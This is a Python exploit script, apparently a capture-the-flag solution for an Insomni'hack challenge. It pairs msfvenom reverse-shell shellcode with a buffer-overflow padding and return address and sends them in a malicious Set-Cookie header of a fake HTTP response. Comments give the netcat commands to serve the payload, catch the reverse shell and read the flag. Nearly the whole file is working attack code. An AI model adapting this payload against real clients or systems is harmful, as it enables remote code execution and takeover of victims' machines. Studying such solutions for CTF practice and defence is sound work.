import struct
import sys

# Generate a payload (change LHOST)
# msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.13.38.112 LPORT=12345 --bad-chars ";\n\r\x0a\x00" -f py -e x86/shikata_ga_nai
'''
shellcode =  ""
shellcode += "\xd9\xc5\xbd\xed\x30\x17\x36\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x12\x83\xc2\x04\x31\x6a\x13\x03\x87\x23\xf5"
shellcode += "\xc3\x66\x9f\x0e\xc8\xdb\x5c\xa2\x65\xd9\xeb\xa5\xca"
shellcode += "\xbb\x26\xa5\xb8\x1a\x09\x99\x73\x1c\x20\x9f\x72\x74"
shellcode += "\xb9\x52\xa3\xf4\xd5\x6e\xab\xc4\x1c\xe6\x4a\x94\x39"
shellcode += "\xa8\xdd\x87\x76\x4b\x57\xc6\xb4\xcc\x35\x60\x29\xe2"
shellcode += "\xca\x18\xdd\xd3\x03\xba\x74\xa5\xbf\x68\xd4\x3c\xde"
shellcode += "\x3c\xd1\xf3\xa1"
'''

# msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.17.102 LPORT=12345 --bad-chars ";\n\r\x0a\x00" -f py -e x86/shikata_ga_nai
shellcode =  ""
shellcode =  ""
shellcode += "\xd9\xc0\xd9\x74\x24\xf4\xbd\xf4\x41\xb7\xb8\x58\x33"
shellcode += "\xc9\xb1\x12\x31\x68\x17\x83\xe8\xfc\x03\x9c\x52\x55"
shellcode += "\x4d\x6d\x8e\x6e\x4d\xde\x73\xc2\xf8\xe2\xfa\x05\x4c"
shellcode += "\x84\x31\x45\x3e\x11\x7a\x79\x8c\x21\x33\xff\xf7\x49"
shellcode += "\x04\x57\x16\xef\xec\xaa\x19\xdf\xd5\x23\xf8\xaf\x40"
shellcode += "\x64\xaa\x9c\x3f\x87\xc5\xc3\x8d\x08\x87\x6b\x60\x26"
shellcode += "\x5b\x03\x14\x17\xb4\xb1\x8d\xee\x29\x67\x1d\x78\x4c"
shellcode += "\x37\xaa\xb7\x0f"


padding = "X" * (524 - len(shellcode))
eip = struct.pack("I",0x080501b4) # jmp eax
#sys.stdout.write(shellcode + padding + eip)

print "HTTP/1.1 200 OK"
print "Date: Mon, 27 Jul 2009 12:28:53 GMT"
print "Server: Apache/2.2.14 (Win32)"
print "Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT"
print "Content-Length: 52"
print "Content-Type: text/html"
print "Connection: Closed"
print "Set-Cookie: " + shellcode + padding + eip
print ""
print "<html>"
print "<body>"
print "<h1>Hello, World!</h1>"
print "</body>"
print "</html>"
print ""
print ""

# In one shell, launch a web server that serves the malicious cookie
# python generate_payload.py | nc -nlvp 80

# In another shell, lauch a reverse shell listener
# nc -nlvvvp 12345

# Visit http://<your IP> using dr-evil.insomni.hack:6666 as a proxy

# In the reverse shell
# cat flag.txt | grep -i ins